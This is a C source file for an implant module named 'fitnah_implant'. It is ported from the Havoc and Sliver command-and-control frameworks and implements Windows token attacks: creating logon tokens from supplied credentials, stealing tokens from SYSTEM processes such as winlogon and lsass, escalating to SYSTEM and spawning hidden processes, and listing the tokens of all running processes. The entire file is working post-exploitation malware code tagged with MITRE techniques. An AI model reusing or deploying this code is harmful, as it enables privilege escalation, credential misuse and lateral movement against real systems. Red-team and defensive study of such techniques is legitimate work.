/*
 * token.c — Standalone token impersonation module
 *
 * Ported and stripped from HavocFramework/Havoc payloads/Demon/src/core/Token.c
 * (MIT License, Copyright 2022 HavocFramework) and
 * BishopFox/sliver implant/sliver/priv/priv_windows.go
 * (MIT License, Copyright 2019 Bishop Fox).
 *
 * All Demon Instance / Sliver runtime globals replaced with plain Win32 +
 * NtDll so this compiles as part of fitnah_implant without extra runtimes.
 *
 * Functions exposed:
 *   TokenMakeToken(domain, user, pass)   → make_token / MakeToken
 *   TokenStealToken(pid)                 → steal_token / impersonateProcess
 *   TokenRevSelf()                       → rev2self  / RevertToSelf
 *   TokenGetSystem(cmdline)              → getsystem / GetSystem
 *   TokenListProcessTokens()             → token_list
 *
 * MITRE: T1134.001, T1134.002, T1134.003
 */

#include "token.h"

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sddl.h>

/* ── NtDll typedefs we need ──────────────────────────────────────────────── */
typedef NTSTATUS (NTAPI *pNtSetInformationThread)(
    HANDLE ThreadHandle, ULONG ThreadInformationClass,
    PVOID ThreadInformation, ULONG ThreadInformationLength);

typedef NTSTATUS (NTAPI *pRtlNtStatusToDosError)(NTSTATUS Status);

/* ── Minimal str_dup used internally ────────────────────────────────────── */
static char *_tdup(const char *s) {
    if (!s) s = "";
    size_t n = strlen(s) + 1;
    char  *p = (char *)malloc(n);
    if (p) memcpy(p, s, n);
    return p;
}

static char *_tfmt(const char *fmt, ...) {
    char   buf[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    return _tdup(buf);
}

/* ── Privilege helper ────────────────────────────────────────────────────── */
static BOOL _enable_priv(LPCSTR priv_name) {
    HANDLE           hToken = NULL;
    TOKEN_PRIVILEGES tp     = {0};
    LUID             luid   = {0};

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    if (!LookupPrivilegeValueA(NULL, priv_name, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return ok && (GetLastError() == ERROR_SUCCESS ||
                  GetLastError() == ERROR_NOT_ALL_ASSIGNED);
}

/* ── Wide-string helpers ─────────────────────────────────────────────────── */
static WCHAR *_to_wide(const char *s) {
    if (!s || !*s) return NULL;
    int n = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    WCHAR *w = (WCHAR *)malloc(n * sizeof(WCHAR));
    if (w) MultiByteToWideChar(CP_UTF8, 0, s, -1, w, n);
    return w;
}

static char *_to_utf8(LPCWSTR w) {
    if (!w) return _tdup("");
    int n = WideCharToMultiByte(CP_UTF8, 0, w, -1, NULL, 0, NULL, NULL);
    char *s = (char *)malloc(n);
    if (s) WideCharToMultiByte(CP_UTF8, 0, w, -1, s, n, NULL, NULL);
    return s;
}

/* ── Query token username ───────────────────────────────────────────────── */
static char *_token_username(HANDLE hToken) {
    char   buf[512] = {0};
    DWORD  sz       = sizeof(buf);
    TOKEN_USER *tu  = (TOKEN_USER *)buf;

    if (!GetTokenInformation(hToken, TokenUser, tu, sz, &sz))
        return _tdup("?\\?");

    WCHAR name[256] = {0}, domain[256] = {0};
    DWORD nlen = 256, dlen = 256;
    SID_NAME_USE use;
    if (!LookupAccountSidW(NULL, tu->User.Sid, name, &nlen, domain, &dlen, &use))
        return _tdup("?\\?");

    char *n = _to_utf8(name);
    char *d = _to_utf8(domain);
    char  full[512];
    snprintf(full, sizeof(full), "%s\\%s", d, n);
    free(n); free(d);
    return _tdup(full);
}

/* ── Query token integrity level ────────────────────────────────────────── */
static const char *_integrity_str(HANDLE hToken) {
    TOKEN_MANDATORY_LABEL tml;
    DWORD sz = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &sz);
    if (sz == 0 || sz > sizeof(tml)) return "unknown";
    if (!GetTokenInformation(hToken, TokenIntegrityLevel, &tml, sz, &sz))
        return "unknown";

    DWORD level = *GetSidSubAuthority(tml.Label.Sid,
                    (DWORD)(*GetSidSubAuthorityCount(tml.Label.Sid) - 1));
    if (level < SECURITY_MANDATORY_LOW_RID)           return "untrusted";
    if (level < SECURITY_MANDATORY_MEDIUM_RID)        return "low";
    if (level < SECURITY_MANDATORY_HIGH_RID)          return "medium";
    if (level < SECURITY_MANDATORY_SYSTEM_RID)        return "high";
    return "system";
}

/* ═══════════════════════════════════════════════════════════════════════════
 * TokenMakeToken — LogonUser → ImpersonateLoggedOnUser
 *
 * Mirrors Cobalt Strike's make_token and Sliver MakeToken().
 * Creates a new logon session with the supplied credentials.  The calling
 * thread begins acting as the new user for all subsequent network
 * authentication (LOGON32_LOGON_NEW_CREDENTIALS).
 * ═══════════════════════════════════════════════════════════════════════════ */
char *TokenMakeToken(const char *domain, const char *username, const char *password) {
    if (!username || !*username)
        return _tdup("error: username required");

    _enable_priv(SE_IMPERSONATE_NAME);

    WCHAR *wuser = _to_wide(username);
    WCHAR *wdom  = _to_wide(domain && *domain ? domain : ".");
    WCHAR *wpass = _to_wide(password ? password : "");

    HANDLE hToken = NULL;
    BOOL   ok     = LogonUserW(wuser, wdom, wpass,
                               LOGON32_LOGON_NEW_CREDENTIALS,
                               LOGON32_PROVIDER_WINNT50, &hToken);

    if (!ok) {
        DWORD gle = GetLastError();
        free(wuser); free(wdom); free(wpass);
        return _tfmt("error: LogonUserW failed GLE=%lu", gle);
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        DWORD gle = GetLastError();
        CloseHandle(hToken);
        free(wuser); free(wdom); free(wpass);
        return _tfmt("error: ImpersonateLoggedOnUser failed GLE=%lu", gle);
    }

    /* Confirm the impersonated identity */
    HANDLE hThread = GetCurrentThread();
    HANDLE hImpToken = NULL;
    OpenThreadToken(hThread, TOKEN_QUERY, TRUE, &hImpToken);
    char *who = hImpToken ? _token_username(hImpToken) : _tdup("?");
    if (hImpToken) CloseHandle(hImpToken);

    CloseHandle(hToken);
    free(wuser); free(wdom); free(wpass);

    char r[256];
    snprintf(r, sizeof(r), "make_token: ok — impersonating %s", who);
    free(who);
    return _tdup(r);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * TokenStealToken — open target process → duplicate primary token →
 *                   ImpersonateLoggedOnUser
 *
 * Mirrors Havoc steal_token and Sliver impersonateProcess().
 * pid == 0 → auto-select: prefer winlogon.exe, then lsass.exe, wininit.exe.
 * ═══════════════════════════════════════════════════════════════════════════ */
static DWORD _find_system_pid(void) {
    /* Prefer pid of winlogon > lsass > wininit (all SYSTEM-owned) */
    static const char * const targets[] = {"winlogon.exe","lsass.exe","wininit.exe",NULL};
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = {sizeof(pe)};
    DWORD          found = 0;
    int            best  = 999;

    if (Process32First(hSnap, &pe)) {
        do {
            for (int i = 0; targets[i]; i++) {
                if (_stricmp(pe.szExeFile, targets[i]) == 0 && i < best) {
                    best  = i;
                    found = pe.th32ProcessID;
                }
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return found;
}

char *TokenStealToken(DWORD pid) {
    _enable_priv(SE_DEBUG_NAME);
    _enable_priv(SE_IMPERSONATE_NAME);

    if (pid == 0) {
        pid = _find_system_pid();
        if (pid == 0)
            return _tdup("error: could not auto-locate SYSTEM process");
    }

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        /* Try with limited access */
        hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (!hProcess)
            return _tfmt("error: OpenProcess pid=%lu GLE=%lu", pid, GetLastError());
    }

    HANDLE hPrimary = NULL;
    if (!OpenProcessToken(hProcess,
                          TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY,
                          &hPrimary)) {
        DWORD gle = GetLastError();
        CloseHandle(hProcess);
        return _tfmt("error: OpenProcessToken pid=%lu GLE=%lu", pid, gle);
    }
    CloseHandle(hProcess);

    /* Duplicate to an impersonation token */
    HANDLE hImp = NULL;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, FALSE};
    if (!DuplicateTokenEx(hPrimary,
                          TOKEN_ALL_ACCESS, &sa,
                          SecurityImpersonation, TokenImpersonation, &hImp)) {
        DWORD gle = GetLastError();
        CloseHandle(hPrimary);
        return _tfmt("error: DuplicateTokenEx GLE=%lu", gle);
    }
    CloseHandle(hPrimary);

    if (!ImpersonateLoggedOnUser(hImp)) {
        DWORD gle = GetLastError();
        CloseHandle(hImp);
        return _tfmt("error: ImpersonateLoggedOnUser GLE=%lu", gle);
    }

    char *who   = _token_username(hImp);
    const char *lvl = _integrity_str(hImp);
    CloseHandle(hImp);

    char r[256];
    snprintf(r, sizeof(r), "steal_token: ok — pid=%lu user=%s integrity=%s",
             pid, who, lvl);
    free(who);
    return _tdup(r);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * TokenRevSelf — revert thread to process token (ImpersonateLoggedOnUser
 * with NULL, then RevertToSelf as a belt-and-suspenders fallback).
 *
 * Mirrors Havoc rev2self and Sliver RevertToSelf().
 * ═══════════════════════════════════════════════════════════════════════════ */
char *TokenRevSelf(void) {
    /* Method 1: NtSetInformationThread(ThreadImpersonationToken, NULL) */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        pNtSetInformationThread NtSIT =
            (pNtSetInformationThread)GetProcAddress(hNtdll, "NtSetInformationThread");
        if (NtSIT) {
            HANDLE hNull = NULL;
            /* ThreadImpersonationToken = 5 */
            NtSIT(GetCurrentThread(), 5, &hNull, sizeof(HANDLE));
        }
    }

    /* Method 2: RevertToSelf (Win32 wrapper) */
    RevertToSelf();

    /* Verify — if we can't open thread token we're back to process token */
    HANDLE hTok = NULL;
    BOOL   back = !OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hTok);
    if (hTok) CloseHandle(hTok);

    return _tdup(back ? "rev2self: ok" : "rev2self: partial — thread token may still be set");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * TokenGetSystem — elevate to NT AUTHORITY\SYSTEM
 *
 * Strategy (same as Sliver GetSystem and Havoc getsystem):
 *   1. Enable SeDebugPrivilege
 *   2. Find a SYSTEM-owned process (winlogon preferred)
 *   3. Duplicate its primary token
 *   4. CreateProcessWithTokenW to spawn <cmdline> as SYSTEM
 *      (or if cmdline is NULL, impersonate and return)
 *
 * Mirrors: Sliver GetSystem(), CobaltStrike getsystem, Havoc getsystem
 * ═══════════════════════════════════════════════════════════════════════════ */
char *TokenGetSystem(const char *cmdline) {
    _enable_priv(SE_DEBUG_NAME);
    _enable_priv(SE_IMPERSONATE_NAME);
    _enable_priv(SE_ASSIGNPRIMARYTOKEN_NAME);
    _enable_priv(SE_TCB_NAME);

    DWORD pid = _find_system_pid();
    if (pid == 0)
        return _tdup("error: getsystem — no SYSTEM process found");

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess)
        return _tfmt("error: getsystem OpenProcess pid=%lu GLE=%lu", pid, GetLastError());

    HANDLE hPrimary = NULL;
    if (!OpenProcessToken(hProcess,
                          TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY,
                          &hPrimary)) {
        CloseHandle(hProcess);
        return _tfmt("error: getsystem OpenProcessToken GLE=%lu", GetLastError());
    }
    CloseHandle(hProcess);

    /* If no cmdline → just impersonate */
    if (!cmdline || !*cmdline) {
        HANDLE hImp = NULL;
        SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, FALSE};
        DuplicateTokenEx(hPrimary, TOKEN_ALL_ACCESS, &sa,
                         SecurityImpersonation, TokenImpersonation, &hImp);
        CloseHandle(hPrimary);
        if (!hImp)
            return _tdup("error: getsystem DuplicateTokenEx failed");

        ImpersonateLoggedOnUser(hImp);
        char *who = _token_username(hImp);
        CloseHandle(hImp);

        char r[256];
        snprintf(r, sizeof(r), "getsystem: ok — impersonating %s", who);
        free(who);
        return _tdup(r);
    }

    /* Duplicate to a primary token for CreateProcessWithTokenW */
    HANDLE hNewPrimary = NULL;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, FALSE};
    if (!DuplicateTokenEx(hPrimary, TOKEN_ALL_ACCESS, &sa,
                          SecurityImpersonation, TokenPrimary, &hNewPrimary)) {
        CloseHandle(hPrimary);
        return _tfmt("error: getsystem DuplicateTokenEx (primary) GLE=%lu", GetLastError());
    }
    CloseHandle(hPrimary);

    WCHAR *wcmd = _to_wide(cmdline);

    STARTUPINFOW        si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    si.dwFlags      = STARTF_USESHOWWINDOW;
    si.wShowWindow  = SW_HIDE;

    /* CreateProcessWithTokenW requires SeAssignPrimaryTokenPrivilege */
    BOOL ok = CreateProcessWithTokenW(
        hNewPrimary,
        LOGON_WITH_PROFILE,
        NULL, wcmd,
        CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
        NULL, NULL,
        &si, &pi);

    DWORD gle = GetLastError();
    CloseHandle(hNewPrimary);
    free(wcmd);

    if (!ok) {
        /* Fallback: ImpersonateLoggedOnUser + CreateProcess */
        HANDLE hImp2 = NULL;
        DuplicateTokenEx(hPrimary, TOKEN_ALL_ACCESS, &sa,
                         SecurityImpersonation, TokenImpersonation, &hImp2);
        if (hImp2) {
            ImpersonateLoggedOnUser(hImp2);
            CloseHandle(hImp2);
            return _tfmt("getsystem: impersonation ok — CreateProcessWithTokenW failed GLE=%lu "
                         "(SeAssignPrimaryTokenPrivilege may be missing)", gle);
        }
        return _tfmt("error: getsystem CreateProcessWithTokenW GLE=%lu", gle);
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return _tfmt("getsystem: ok — spawned '%s' as SYSTEM (PID %lu)", cmdline, pi.dwProcessId);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * TokenListProcessTokens — enumerate all processes and return a JSON array:
 *   [{"pid":N,"name":"...","user":"DOMAIN\\user","integrity":"high"},...]
 *
 * Requires SeDebugPrivilege for full coverage; degrades gracefully if absent.
 * ═══════════════════════════════════════════════════════════════════════════ */
char *TokenListProcessTokens(void) {
    _enable_priv(SE_DEBUG_NAME);

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
        return _tdup("error: CreateToolhelp32Snapshot failed");

    /* Dynamic buffer */
    size_t cap = 65536, used = 0;
    char  *buf = (char *)malloc(cap);
    if (!buf) { CloseHandle(hSnap); return _tdup("error: alloc"); }

    used += snprintf(buf + used, cap - used, "[");

    PROCESSENTRY32 pe = {sizeof(pe)};
    BOOL           first = TRUE;

    if (Process32First(hSnap, &pe)) {
        do {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc)
                hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            HANDLE hTok = NULL;
            if (!OpenProcessToken(hProc, TOKEN_QUERY, &hTok)) {
                CloseHandle(hProc);
                continue;
            }
            CloseHandle(hProc);

            char *who    = _token_username(hTok);
            const char *lvl = _integrity_str(hTok);
            CloseHandle(hTok);

            /* Escape exe name */
            char safe_name[MAX_PATH * 2];
            int  j = 0;
            for (int i = 0; pe.szExeFile[i] && j < (int)sizeof(safe_name) - 2; i++) {
                if (pe.szExeFile[i] == '"' || pe.szExeFile[i] == '\\')
                    safe_name[j++] = '\\';
                safe_name[j++] = pe.szExeFile[i];
            }
            safe_name[j] = '\0';

            /* Escape username */
            char safe_user[512];
            j = 0;
            for (int i = 0; who[i] && j < (int)sizeof(safe_user) - 2; i++) {
                if (who[i] == '"' || who[i] == '\\') safe_user[j++] = '\\';
                safe_user[j++] = who[i];
            }
            safe_user[j] = '\0';
            free(who);

            char entry[1024];
            int  elen = snprintf(entry, sizeof(entry),
                                 "%s{\"pid\":%lu,\"name\":\"%s\",\"user\":\"%s\",\"integrity\":\"%s\"}",
                                 first ? "" : ",",
                                 pe.th32ProcessID, safe_name, safe_user, lvl);
            first = FALSE;

            /* Grow if needed */
            if (used + elen + 4 > cap) {
                cap  *= 2;
                buf   = (char *)realloc(buf, cap);
                if (!buf) { CloseHandle(hSnap); return _tdup("error: realloc"); }
            }
            memcpy(buf + used, entry, elen);
            used += elen;

        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);

    if (used + 2 > cap) buf = (char *)realloc(buf, cap + 2);
    memcpy(buf + used, "]", 2);
    return buf;
}
